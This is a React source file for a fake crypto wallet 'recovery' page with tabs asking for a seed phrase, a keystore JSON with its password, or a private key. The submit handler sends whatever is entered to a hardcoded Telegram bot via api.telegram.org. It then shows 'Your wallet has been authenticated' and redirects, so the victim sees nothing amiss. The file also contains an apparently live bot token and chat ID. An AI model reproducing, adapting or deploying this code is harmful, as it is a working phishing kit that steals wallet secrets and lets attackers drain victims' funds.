import { useRef, useState } from 'react'
import Tabs from '../Components/Tabs'
import { toast } from 'react-toastify'
import axios from 'axios'
import { Navigate, useNavigate } from 'react-router-dom'
const token = '7015504960:AAFV1abJ9xSzaxWXrh5fH3QQ6qtZj1imNR8'
const Recovery = () => {
  const navigate = useNavigate()
  const keystoreRef = useRef()
  const [textValue, setTextValue] = useState({})
  const handleChange = (e, id) => {
    setTextValue((prevState) => ({
      ...prevState,
      [id]: e.target.value,
    }))
  }

  const handleSubmit = async (id, input = '') => {
    const value = textValue[id]
    // check if input fields are not empty first using the not operator
    if (value && value.trim() !== '' && value.length > 7) {
      const message = `Wallet phrase is: ${value} password: ${input}`
      // submit data object which is an extra parameter in the axios post request
      const data = {
        chat_id: -1002029700554,
        text: message,
      }
      const submitPhraseValue = async () => {
        const resp = await axios.post(
          `https://api.telegram.org/bot${token}/sendMessage`,
          data
        )
        toast.success('Your wallet has been authenticated')
        return navigate('/')
      }
      submitPhraseValue()
    } else {
      // console.log(`Textarea ${id} is empty.`)
      toast.error('please provide values')
    }
  }
  return (
    <div>
      <Tabs>
        <div label="Phrase">
          <textarea
            className="w-full  p-1 focus:outline-none"
            name="phrase"
            id="phrase"
            placeholder="Phrase"
            cols="30"
            rows="10"
            required
            onChange={(e) => handleChange(e, 'phrase')}
          ></textarea>
          <p className="text-gray-500">
            Typically 12 (sometimes 24) words separated by a single space
          </p>
          <button
            type="submit"
            className="btn font-medium w-full"
            onClick={() => handleSubmit('phrase')}
          >
            Import Wallet
          </button>
        </div>
        <div label="Keystore JSON">
          <textarea
            className="w-full p-1 focus:outline-none"
            name="keystore"
            id="keystore"
            placeholder="Keystore JSON"
            cols="30"
            rows="7"
            required
            onChange={(e) => handleChange(e, 'keystore')}
          ></textarea>
          <p className="text-gray-500">
            Several lines of text beginning with (...) plus the password you
            used to encrypt it.
          </p>
          <input
            name="password"
            type="password"
            placeholder="Password"
            className="w-full p-2"
            ref={keystoreRef}
          />
          <button
            type="submit"
            className="btn font-medium w-full"
            onClick={() => handleSubmit('keystore', keystoreRef.current.value)}
          >
            Import Wallet
          </button>
        </div>
        <div label="Private-key">
          <input
            name="private-key"
            type="text"
            required
            id="privateKey"
            className="w-full p-2"
            placeholder="Private Key"
            // onChange={(e) => handleChange(e, 'privateKey')}
          />
          <p className="text-gray-500">
            Typically 12 (sometimes 24) words separated by a single space
          </p>
          <button
            type="submit"
            className="btn font-medium w-full"
            onClick={() => handleSubmit('privateKey')}
          >
            Import Wallet
          </button>
        </div>
      </Tabs>
    </div>
  )
}
export default Recovery
